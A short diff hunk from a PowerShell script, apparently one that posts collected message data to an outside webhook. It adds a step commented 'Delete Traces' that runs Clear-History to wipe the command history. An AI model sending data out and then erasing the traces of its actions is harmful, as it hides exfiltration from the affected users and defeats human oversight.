@@ -31,3 +31,6 @@ $message_data = @{
 }
 
 Invoke-WebRequest -Uri $webhook_url -Method Post -ContentType "application/json" -Body ($message_data | ConvertTo-Json)
+
+# Delete Traces
+Clear-History
